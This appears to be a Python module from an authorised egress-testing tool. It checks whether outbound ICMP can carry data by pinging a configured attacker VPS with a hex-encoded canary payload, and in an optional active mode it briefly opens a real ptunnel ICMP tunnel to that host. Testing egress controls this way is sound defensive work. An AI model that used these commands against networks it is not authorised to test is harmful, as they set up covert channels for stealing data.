"""Family E — ICMP exfiltration channel (marked canary payload).

Tests whether ICMP can carry data out (a ptunnel-style covert channel). It sends
echo requests whose payload is a marked synthetic canary and checks the replies
carry the data back — proving ICMP can ferry arbitrary bytes end-to-end. Restricted
/ monitored ICMP egress should stop or flag this.

  * INDICATOR (default): ping the target/attacker_vps with a marked data payload;
    replies-with-data = the channel is open.
  * ACTIVE (--active): if ptunnel + attacker_vps are present, bring up a real ICMP
    tunnel briefly and tear it down.

Linux (uses `ping -p`). SAFE: small marked synthetic payload. MITRE T1048.003.
"""
import subprocess
from modules import _util as U

# "MYGOVNET-USS-ICMP-CANARY" as hex (ping -p takes a hex pattern, max 16 bytes)
_PAYLOAD_HEX = "4d59474f564e45542d5553532d43414e"

META = {
    "id": "icmp_exfil",
    "name": "ICMP Exfiltration (marked payload)",
    "category": "Exfiltration",
    "test_type": "attack_sim",
    "family": "E",
    "direction": "a2b",
    "added": True,
    "active": True,
    "control": "Restrict/monitor outbound ICMP; volumetric analytics",
    "fix": "SD-WAN",
    "mitre": ["T1048.003"],
    "tactic": "Exfiltration",
    "cwe": ["CWE-693"],
    "requires": ["ping"],
    "os_supported": ["Linux"],
    "ports": [("icmp", None)],
    "success_regex": r"^ICMP-EXFIL-OPEN",
    "blocked_regex": r"ICMP channel blocked",
}


def run(target, ctx):
    dest = ctx.cfg("attacker_vps") or target
    out = [f"# ICMP exfil test vs {dest} (Family E) — marked synthetic payload"]
    try:
        p = subprocess.run(["ping", "-c", "3", "-p", _PAYLOAD_HEX, dest],
                           capture_output=True, text=True, timeout=15)
        replied = "bytes from" in p.stdout and " 0 received" not in p.stdout
        out.append(p.stdout.strip()[-400:])
        if replied:
            out.append("ICMP-EXFIL-OPEN — echo replies returned carrying the data payload; "
                       "ICMP can ferry arbitrary bytes out. [FINDING] restrict/monitor "
                       "outbound ICMP (volumetric analytics).")
        else:
            out.append("ICMP channel blocked — no usable replies (ICMP egress restricted)")
    except subprocess.TimeoutExpired:
        out.append("ICMP channel blocked — ping timed out")
        return "\n".join(out)
    except FileNotFoundError:
        return "# ICMP exfil test\n[ERROR] ping not found"
    except Exception as e:
        out.append(f"ICMP: error {e}")
        return "\n".join(out)

    if ctx.allow_active and ctx.cfg("attacker_vps") and U.have("ptunnel"):
        out.append(f"[ACTIVE] ptunnel to {dest} for up to 10s …")
        log, matched = U.run_transient(["ptunnel", "-p", dest], seconds=10,
                                       look_for=["session", "connection", "tunnel"])
        out.append(log)
    elif ctx.allow_active:
        out.append(U.skip("--active set but ptunnel/attacker_vps unavailable — indicator only."))
    return "\n".join(out)
